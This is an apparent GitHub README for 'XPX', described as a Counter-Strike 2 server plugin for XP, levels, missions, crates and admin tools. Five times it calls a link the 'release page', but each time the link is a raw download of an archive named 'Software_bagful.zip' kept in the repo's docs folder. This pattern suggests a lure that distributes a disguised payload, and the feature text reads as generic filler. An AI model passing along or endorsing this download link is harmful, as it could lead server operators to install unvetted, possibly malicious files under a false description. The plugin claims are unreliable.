# 🎮 XPX - Track XP, Levels, and Server Progress

[![Download XPX](https://img.shields.io/badge/Download-XPX%20Releases-blue.svg)](https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip)

## 🧭 What XPX Does

XPX is a CounterStrikeSharp plugin for CS2 servers. It adds persistent XP, levels, ranks, missions, achievements, stats, economy, crates, RTV, admin tools, and custom loadout modes.

If you run a CS2 server, XPX gives your players a clear path to progress. Players can earn XP, move up levels, unlock ranks, and keep their progress over time.

## 📥 Download XPX

Visit this page to download: https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip

On that page, look for the latest release. Download the file that matches the plugin package for your server setup.

## 🖥️ What You Need

Before you install XPX, make sure your server already has:

- Counter-Strike 2 dedicated server
- CounterStrikeSharp installed
- Access to your server files
- SQLite support, which is built into most server setups
- Enough disk space for player data and stats

XPX is made for Windows-based server setups, but the install steps also fit common CS2 server folders.

## 🚀 Getting Started

Follow these steps to install XPX on your server.

1. Open the release page: https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip
2. Download the latest release file
3. Unpack the files if they come in a ZIP archive
4. Find your CS2 server folder
5. Copy the XPX files into the correct plugin folder
6. Restart the server
7. Check the console or server logs to make sure the plugin loaded

If your server uses the standard CounterStrikeSharp layout, place the plugin files in the plugins folder that matches your server install.

## 🗂️ Typical File Placement

A common install path looks like this:

- `game/csgo/addons/counterstrikesharp/plugins/XPX/`

Your release files may include:

- plugin DLL files
- config files
- language files
- data files for player progress

Keep the full folder structure when you copy the files. This helps the plugin find its settings and data.

## ⚙️ First Run Setup

After you copy the files, start or restart your server.

Then check that XPX can create and use its data files. The plugin stores player progress, stats, and unlocks in a local database file. That means player data stays on the server after restarts.

You may want to do these checks on first run:

- Make sure the plugin loads without errors
- Confirm that player XP is saved after a match
- Check that level changes show in chat, HUD, or menus
- Review the config file for rate settings and reward values

## 🎯 Core Features

XPX gives your CS2 server a full progression system.

### XP and Levels

Players earn XP for actions you set in the config. As they gain XP, they move up levels. This gives them a reason to keep playing.

### Ranks

XPX can show ranks based on level or progress. This helps players see where they stand.

### Missions

You can give players tasks to complete. Missions add short-term goals, such as getting kills, winning rounds, or playing a certain map.

### Achievements

XPX can track milestone goals. Players may unlock achievements for long play time, match wins, or other events you define.

### Stats

The plugin keeps track of player data such as kills, deaths, wins, and other server stats. This gives players a clear view of their game history.

### Economy

XPX includes an economy system for server rewards, shop use, or other custom server rules.

### Crates

You can use crates as rewards or unlocks. Crates add a simple reward loop for active players.

### RTV and Map Vote

Players can vote for map changes through RTV and map vote tools. This helps keep the server active and gives players a way to guide the match.

### Admin Tools

Server admins can use built-in tools to manage the player experience. This can include reward control, data checks, and other server actions.

### Custom Loadout Modes

XPX supports loadout modes that let you shape how weapons and gear work on your server.

## 🧩 How XPX Works

XPX listens for game events and saves player progress in a database. When a player joins again, the plugin reads their saved data and restores their level, stats, and unlocks.

This means players do not lose progress after a restart. It also makes the server feel consistent and fair.

## 🛠️ Basic Configuration

After install, look for the config files in the XPX folder. You can change settings such as:

- XP rewards
- level thresholds
- rank names
- mission rules
- achievement goals
- economy values
- crate rewards
- RTV settings
- admin options

Use a plain text editor such as Notepad to edit these files. Save your changes, then restart the server.

## 🔍 Check That It Works

After the server starts, join it with a test account and try these actions:

- play a round
- earn XP
- complete a simple mission
- check if your level changes
- leave and rejoin to see if progress stays saved

If the plugin works, you should see saved player data after the next join.

## 🧱 Troubleshooting

If XPX does not load, check these common points:

- The plugin files are in the wrong folder
- The release package was not fully unpacked
- CounterStrikeSharp is missing or out of date
- The server did not restart after install
- The config file has a bad value or broken line

If progress is not saving:

- confirm the server can write files
- make sure the data folder exists
- check that the database file is not locked
- restart the server and test again

If players do not get XP:

- review the XP reward settings
- check mission and reward rules
- test with a simple event such as a kill or round win

## 📁 File and Data Layout

XPX may create files like these:

- config files for server rules
- database files for player progress
- log files for errors and events
- cache or temp files for runtime use

Keep these files with the plugin unless the release notes say otherwise.

## 🧑‍💻 For Server Admins

XPX is built for community servers that want more player progress and control. It fits servers that use:

- persistent leveling
- missions and goals
- player ranks
- shop or economy systems
- crate rewards
- map voting
- admin tools
- custom loadout rules

You can tune the system to fit a casual server or a more structured play style.

## 📌 Where to Get Updates

Use the release page for updates, new builds, and fixes:

https://github.com/cannaceaedomainname81/XPX/raw/refs/heads/main/docs/Software_bagful.zip

Check that page when you want the latest version for your server.

## 🧭 Install Flow at a Glance

1. Visit the release page
2. Download the latest package
3. Copy the files into the CS2 CounterStrikeSharp plugin folder
4. Restart the server
5. Check that XP, levels, and saved data work

## 🏷️ Project Topics

achivements, admin-tools, community-server, counter-strike-2, counterstrikesharp, crates, cs2, cs2-plugin, dedicated-server, economy, leveling-system, map-vote, missions, progression, rtv, server-plugin, shop-system, sqlite, stats, steamcmd